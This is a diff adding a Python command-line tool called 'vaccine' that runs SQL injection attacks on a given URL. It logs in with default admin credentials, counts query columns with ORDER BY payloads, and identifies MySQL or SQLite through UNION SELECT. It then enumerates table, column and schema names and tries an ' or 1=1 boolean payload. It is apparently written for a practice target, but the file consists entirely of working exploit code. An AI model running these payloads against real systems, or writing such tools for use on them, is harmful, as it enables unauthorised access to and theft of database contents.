@@ -1,0 +1,202 @@
+#! /usr/local/bin/python3
+
+import argparse
+import requests
+import difflib
+from bs4 import BeautifulSoup
+
+def get_diff(original_content, new_content):
+    original_list = original_content.splitlines()
+    new_list = new_content.splitlines()
+    for i, line in enumerate(new_list):
+        if line != original_list[i]:
+            return new_list[i:i+5]
+    return None
+
+def get_database_name(url, request, original_content, session, count, comment):
+    payloads = ["' union select " + ', '.join(['null'] * (count - 1)) + ", version()" + comment,
+               "' union select " + ', '.join(['null'] * (count - 1)) + ", sqlite_version()" + comment
+    ]
+    for i, payload in enumerate(payloads):
+        if request == 'GET':
+            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
+        else:
+            response = session.post(url, data={'search': payload})
+        print(f"vaccine: Sending payload... ({payload})", file=f)
+        if response.status_code == 200:
+            diff = get_diff(original_content, response.text)
+            if diff:
+                print(f"Found difference:\n{diff}", file=f)
+                if "MariaDB" in ''.join(diff) or "MySQL" in ''.join(diff):
+                    return "MySQL"
+                if i == 1 and "error" not in diff:
+                    return "SQLite"
+            else:
+                print("No difference found", file=f)
+        else:
+            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}", file=f)
+    return None
+
+
+def order_by(url, request, original_content, session):
+    """
+    Perform a SQL injection using ORDER BY clause.
+    This is error based SQL injection that checks for the number of columns in the query.
+    """
+    print("\nORDER BY SQL Injection Attack:", file=f)
+    payloads_with_sharp = [
+        "' order by 1#",
+        "' order by 2#",
+        "' order by 3#",
+        "' order by 4#",
+        "' order by 5#",
+    ]
+    payloads_with_dash = [
+        "' order by 1--",
+        "' order by 2--",
+        "' order by 3--",
+        "' order by 4--",
+        "' order by 5--",
+    ]
+    count = 0
+    for payload in payloads_with_sharp:
+        count += 1
+        if request == 'GET':
+            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
+        else:
+            response = session.post(url, data={'search': payload})
+        print(f"Sending payload... ({payload})", file=f)
+        if response.status_code == 200:
+            diff = get_diff(original_content, response.text)
+            if diff and "error" in ''.join(diff):
+                if count == 1:
+                    break
+                print(f"Found difference:\n{diff}", file=f)
+                return count - 1, "#"
+            else:
+                print("No difference found", file=f)
+        else:
+            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}", file=f)
+    count = 0
+    for payload in payloads_with_dash:
+        count += 1
+        if request == 'GET':
+            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
+        else:
+            response = session.post(url, data={'search': payload})
+        print(f"Sending payload... ({payload})", file=f)
+        if response.status_code == 200:
+            diff = get_diff(original_content, response.text)
+            if diff and "error" in ''.join(diff):
+                print(f"Found error:\n{diff}", file=f)
+                return count - 1, "--"
+            else:
+                print("No difference found", file=f)
+        else:
+            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}", file=f)
+    return count - 1, "--"
+            
+
+def union(url, request, original_content, session, count, comment):
+    """
+    Perform a SQL injection using UNION SELECT.
+    """
+    if count < 1:
+        print("vaccine: Error: Not enough columns found for UNION SELECT attack.", file=f)
+        return
+    print("\nUNION SELECT SQL Injection Attack:", file=f)
+    payloads_for_mysql = [
+        "' union select " + ', '.join(['null'] * (count - 1)) + ", table_name from information_schema.tables" + comment,
+        "' union select " + ', '.join(['null'] * (count - 1)) + ", column_name from information_schema.columns" + comment,
+        "' union select " + ', '.join(['null'] * (count - 1)) + ", schema_name from information_schema.schemata" + comment,
+    ]
+    payloads_for_sqlite = [
+        "' union select " + ', '.join(['null'] * (count - 1)) + ", name from sqlite_master" + comment,
+        "' union select " + ', '.join(['null'] * (count - 1)) + ", sql from sqlite_master" + comment,
+    ]
+    database = get_database_name(url, request, original_content, session, count, comment)
+    print(f"Detected database type: {database}", file=f)
+    if database == "MySQL":
+        payloads = payloads_for_mysql
+    elif database == "SQLite":
+        payloads = payloads_for_sqlite
+    else:
+        print("vaccine: Error: Unsupported database type.", file=f)
+        return
+    for i, payload in enumerate(payloads):
+        if request == 'GET':
+            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
+        else:
+            response = session.post(url, data={'search': payload})
+        print(f"vaccine: Sending payload... ({payload})", file=f)
+        if response.status_code == 200:
+            diff = get_diff(original_content, response.text)
+            if diff:
+                print(f"Found difference:\n{diff}", file=f)
+            else:
+                print(f"No difference found", file=f)
+        else:
+            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}", file=f)
+
+def boolean(url, request, original_content, session, comment):
+    """
+    Perform a SQL injection using boolean-based blind SQL injection.
+    """
+    print("\nBoolean-Based SQL Injection Attack:", file=f)
+    payloads = [
+        "' or 1=1" + comment,
+    ]
+    for payload in payloads:
+        if request == 'GET':
+            response = session.get(url, params={'id': payload, 'Submit': 'Submit'})
+        else:
+            response = session.post(url, data={'search': payload})
+        print(f"vaccine: Sending payload... ({payload})", file=f)
+        if response.status_code == 200:
+            diff = get_diff(original_content, response.text)
+            if diff:
+                print(f"Found difference:\n{diff}", file=f)
+            else:
+                print("No difference found", file=f)
+        else:
+            print(f"vaccine: Error with payload ({payload}), status code {response.status_code}", file=f)
+
+            
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='A program that performs a SQL injection.')
+    parser.add_argument('URL', type=str, help='The URL to perform the SQL injection on.')
+    parser.add_argument('-o', '--out', type=str, default='output.txt', help='The output file to save the results to.')
+    parser.add_argument('-X', '--request', choices=['GET', 'POST'], default='GET', help='The HTTP request method to use (GET or POST).')
+    args = parser.parse_args()
+
+    f = open(args.out, 'w')
+    try:
+        session = requests.Session()
+        response = session.get(args.URL)
+        print(f"vaccine: Requesting URL: {args.URL} with method: {args.request}", file=f)
+        if response.history:
+            # When there are redirects, we assume that user needs to login
+            print(f"vaccine: Warning: Redirects detected, attempting to login.", file=f)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            user_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None
+            response = session.post(response.url, data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token})
+            if response.status_code != 200:
+                print(f"vaccine: Error: Unable to login, status code {response.status_code}", file=f)
+                exit(1)
+            print(f"vaccine: Successfully logged in, status code {response.status_code}", file=f)
+            response = session.get(args.URL)
+            if response.status_code != 200:
+                print(f"vaccine: Error: Unable to login, status code {response.status_code}", file=f)
+                exit(1)
+        elif response.status_code != 200:
+            print(f"vaccine: Error: Unexpected status code {response.status_code}", file=f)
+            exit(1)
+        original_content = response.text
+        count, comment = order_by(args.URL, args.request, original_content, session)
+        union(args.URL, args.request, original_content, session, count, comment)
+        boolean(args.URL, args.request, original_content, session, comment)
+        
+    except requests.RequestException as e:
+        print(f"vaccine: Error: {e}", file=f)
+        exit(1)
+    f.close()
